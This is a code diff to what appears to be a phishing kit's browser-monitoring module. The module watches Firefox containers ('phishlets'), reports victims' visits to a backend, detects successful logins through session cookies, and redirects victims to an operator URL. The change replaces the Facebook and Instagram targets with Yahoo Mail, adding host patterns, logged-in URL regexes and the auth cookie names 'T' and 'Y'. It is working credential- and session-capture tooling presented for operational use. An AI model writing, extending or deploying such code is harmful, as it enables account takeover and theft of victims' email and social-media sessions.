@@ -3,7 +3,7 @@
 
 Runs inside a Firefox container (one per phishlet).  Every ~2s it
 asks Firefox what URL the active tab is on, classifies it as one of
-{gmail, outlook, facebook, instagram}, reports the visit to the
+    {gmail, outlook, yahoo}, reports the visit to the
 backend, and once a successful login is detected (URL pattern + auth
 cookies present in cookies.sqlite) it triggers a redirect to the
 operator-supplied URL via xdotool.
@@ -48,19 +48,12 @@ PHISHLETS = {
         ),
         "auth_cookies": ("OutlookIdentity", "OutlookSession", "RPSSecAuth", "MSPAuth"),
     },
-    "facebook": {
-        "url_hosts": ("facebook.com", "www.facebook.com", "m.facebook.com", "web.facebook.com"),
+    "yahoo": {
+        "url_hosts": ("mail.yahoo.com", "login.yahoo.com", "yahoo.com"),
         "logged_in_url_re": re.compile(
-            r"^https://(www\.|m\.|web\.)?facebook\.com/(?!login|checkpoint)(.*)"
+            r"^https://(mail\.|login\.)?yahoo\.com/(?!login|signup)(.*)"
         ),
-        "auth_cookies": ("c_user", "xs"),
-    },
-    "instagram": {
-        "url_hosts": ("instagram.com", "www.instagram.com"),
-        "logged_in_url_re": re.compile(
-            r"^https://www\.instagram\.com/(?!accounts/login)(.*)"
-        ),
-        "auth_cookies": ("sessionid", "ds_user_id"),
+        "auth_cookies": ("T", "Y"),
     },
 }
 
